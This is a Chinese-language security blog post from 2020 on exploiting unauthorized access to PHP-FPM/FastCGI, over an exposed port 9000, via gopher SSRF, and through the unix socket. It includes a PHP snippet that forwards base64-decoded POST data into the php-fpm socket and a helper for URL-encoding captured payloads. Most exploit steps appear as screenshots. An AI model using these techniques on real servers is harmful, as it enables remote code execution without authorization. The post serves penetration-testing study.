---
layout:     post
title:      PHP-FPM Fastcgi 未授权访问漏洞
subtitle:   。。
date:       2020-06-13
author:     BY Diego
header-img: img/wenzhang/PHP-FPM.jpg
catalog: true
tags:
    - 命令注入
    - PHP
---

# 一、PHP-FPM 两种模式

**php-fpm 有两种模式，一种是基于tcp 另一种是基于unix套接字，tcp模式会启动9000端口 而unix套接字模式是基于fpm.sock文件**


**tcp模式下配置文件**

fpm 配置文件
`/etc/php/7.4/fpm/pool.d/www.conf`
![tvbEYn.png](https://s1.ax1x.com/2020/06/13/tvbEYn.png)

nginx 配置文件
`/etc/nginx/sites-enabled/default`
![tvbAFs.png](https://s1.ax1x.com/2020/06/13/tvbAFs.png)

效果如下会开启9000端口
![tvb6pt.png](https://s1.ax1x.com/2020/06/13/tvb6pt.png)
**unix模式下配置文件**

fpm 配置文件
`/etc/php/7.4/fpm/pool.d/www.conf`
![tvH1RP.png](https://s1.ax1x.com/2020/06/13/tvH1RP.png)

nginx 配置文件
`/etc/nginx/sites-enabled/default`
![tvHlGt.png](https://s1.ax1x.com/2020/06/13/tvHlGt.png)

![tvqzqS.png](https://s1.ax1x.com/2020/06/13/tvqzqS.png)

# 二、攻击

具体原理参考其他文章，个人简单记录攻击方法

## ① Fastcgi暴露在外网

**tcp模式下的9000端口暴露外网**

直接利用poc 进行攻击，前提知道某php脚本的绝对路径，一般有php环境的都会自带php文件，根据实际选一个
![tjc98s.png](https://s1.ax1x.com/2020/06/13/tjc98s.png)

效果如下
![tjcPvq.png](https://s1.ax1x.com/2020/06/13/tjcPvq.png)


## ② Fastcgi在内网

**tcp模式下的9000端口在内网**

利用**gopher协议** 进行ssrf

可以本地先搭建个环境，直接用vulhub也行，用上面的脚本进行流量抓取
![tjcC2n.png](https://s1.ax1x.com/2020/06/13/tjcC2n.png)
跟踪一下流
![tjcpCj.png](https://s1.ax1x.com/2020/06/13/tjcpCj.png)
把发送数据转化成原始数据
![tj6z5Q.png](https://s1.ax1x.com/2020/06/13/tj6z5Q.png)

url编一下码
```python
data = ""
a = [ data[x:x+2] for x in range(0,len(data),2) ]
"%".join(a)
```
![tjcFK0.png](https://s1.ax1x.com/2020/06/13/tjcFK0.png)

然后利用curl 模拟一下
![tjW8ld.png](https://s1.ax1x.com/2020/06/13/tjW8ld.png)

或者直接利用工具自动生成payload
![tjWG6A.png](https://s1.ax1x.com/2020/06/13/tjWG6A.png)

![tjW3SH.png](https://s1.ax1x.com/2020/06/13/tjW3SH.png)


## ③ unix套接字攻击

使用的是unix套接字，因此不会开放9000端口，但同样需要存在php文件

需要在服务器端执行如下代码
```php
<?php
$sock=stream_socket_client('unix:///run/php/php7.3-fpm.sock');
fputs($sock, base64_decode($_POST['A']));
var_dump(fread($sock, 4096));
?>
```
可以通过工具生成，然后截取`_`以后的部分，url解码之后转base64
![tjWG6A.png](https://s1.ax1x.com/2020/06/13/tjWG6A.png)


也可跟ssrf相同方法 获得原始数据直接转base64

![tvXBKP.png](https://s1.ax1x.com/2020/06/13/tvXBKP.png)

# 三、参考

[PHP 连接方式&攻击PHP-FPM&*CTF echohub WP](https://evoa.me/index.php/archives/52/#toc-%E6%94%BB%E5%87%BB%E5%A5%97%E6%8E%A5%E5%AD%97)

[浅析php-fpm的攻击方式](https://xz.aliyun.com/t/5598#toc-8)

[Fastcgi协议分析 && PHP-FPM未授权访问漏洞 && Exp编写](https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html)
